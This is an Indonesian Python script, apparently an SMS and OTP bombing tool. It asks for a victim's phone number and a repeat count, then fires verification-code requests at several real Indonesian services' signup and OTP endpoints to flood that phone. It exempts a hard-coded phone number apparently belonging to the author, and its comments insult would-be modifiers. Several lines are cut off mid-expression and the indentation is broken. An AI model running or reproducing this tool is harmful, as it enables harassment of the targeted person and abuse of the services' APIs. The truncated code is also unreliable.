# SpamSms
#Pake Aja Gan:v
#njir mau di recode sksk
#Buat Paan Recod? Belajar Bahasa Pemerograman Sana Hadeeehh Kek Kntl Lu
import requests as reek,json,os,time,requests
try:
        import pyfiglet
except:
        os.system("pip install pyfiglet")
req=reek.Session()
os.system('clear')
title=pyfiglet.figlet_format("Spam Sms")
p = "\33[37;1m"
h = "\33[32;1m"
m = "\33[31;1m"
ber=0
gag=0
class nyepam:
        def __init__(self,_8,_08,_62):
                self._8,self._08,self._62=_8,_08,_62
        def mulai(self,asu):
                try:
                        for x in range(asu):
                                send=req.post("https://cmsapi.mapclub.com/api/signup-otp",data={"phone":self._08},headers={"Connection": "ke>
                                if "ok" in send:break
                                else:break
                        for x in range(asu):
                                send=req.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=json.dumps({"ketik":0,"nomor":"0">
                                if "Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok." in send:break
                                else:break
                        for x in range(asu):
                                send=json.loads(reek.get(f"https://id.jagreward.com/member/verify-mobile/{self._8}").text)
                                if send["message"]=="Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari>
                  bingung()
                except reek.exceptions.ReadTimeout:exit(f"{m}[!] Kesalahan Pada Koneksi")
                except reek.exceptions.ConnectionError:exit(f"{m}[!] Kesalahan Pada Koneksi")
                except (KeyboardInterrupt,EOFError):exit("[!] Exit")
__import__("os").system("clear")
def bingung():
        print(f"{h}\n[√] Semua Spam Terkirim Berhasil{p}\n")
        print(f"Ingin Spam Lagi?\nKetik y untuk ya ketik t untuk tidak\n")
        pilih=input("y/t : ")
        if(pilih=="y"):
                cok()
        elif(pilih=="t"):
                exite("Terima Kasih!")
        else:
                print("Masukan Yang Benar!")
                bingung()
def cok():
        while True:
                try:
                        a=input("[+] Nomer Korban 08×××\t: ")
                        asu=a[0:2]
                        if a in(""," "):print("[!] Jangan Kosong Ajg")
                        elif "08" not in asu:print("[!] Gunakan Nomer 08xxx\n")
                        elif len(a)<=10:print("[!] Nomer Harus Lebih Dari 10 Angka")
                        elif a=="083870396203":print("[!] Anda Tidak Bisa Spam Yang Punya Script Goblok!\n")
                        else:
                                try:
                                        suu=int(input("[+] Masukan Jumlah Spam\t: "))
                                except:
                                        print("Masukan Format Angka Jangan Huruf!")
                                        cok()
         
